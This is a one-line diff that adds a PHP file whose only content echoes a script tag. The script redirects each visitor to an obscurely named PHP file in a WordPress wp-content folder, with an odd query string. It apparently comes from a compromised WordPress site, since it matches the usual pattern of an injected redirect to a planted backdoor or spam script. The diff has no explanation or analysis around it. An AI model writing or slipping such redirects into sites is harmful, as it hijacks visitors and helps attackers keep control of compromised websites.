@@ -1,0 +1,1 @@
+<?php echo '<script> location.href=\'/wp-content/fqek4.php?FOx=E89MY\'; </script>'; ?>
